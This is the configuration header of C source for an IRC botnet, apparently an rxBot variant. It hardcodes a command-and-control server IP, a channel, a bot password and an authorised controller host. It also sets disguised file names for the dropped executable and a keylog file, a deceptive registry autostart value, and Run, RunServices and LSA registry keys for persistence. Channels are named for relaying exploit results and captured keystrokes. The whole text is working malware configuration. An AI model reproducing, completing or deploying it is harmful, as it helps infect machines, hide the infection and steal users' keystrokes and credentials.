
int port = 8782;				// server port
int port2 = 13601;				// backup server port

BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 9;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="%temp%\\yas.jpg";
#endif




char botid[] = "rx-asn-2-re-worked ";						// bot id
char version[] = "stripped";		// Bots !version reply
char password[] = "hardcore";					// bot password
char server[] = "213.82.66.4";		// server
char serverpass[] = "";						// server password
char channel[] = "#stripper";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "winslogin.exe";			// destination file name
char keylogfile[] = "abba.mp3";				// keylog filename
char valuename[] = "Microsoft Stuff you know";		// value name for autostart
char nickconst[] = "net-";					// first part to the bot's nick
char szLocalPayloadFile[]="helper.exe";	// Payload filename
char modeonconn[] = "-xi+B";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#stripper";					// Channel where exploit messages get redirected
char keylogchan[] = "#keylog";						// Channel where keylog messages get redirected
						// Channel where psniff messages get redirected 

char *authost[] = {
	"snake@NeT-AdMiN"
};

char *versionlist[] = {
	"mIRC v6.12 Khaled Mardam-Bey",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";


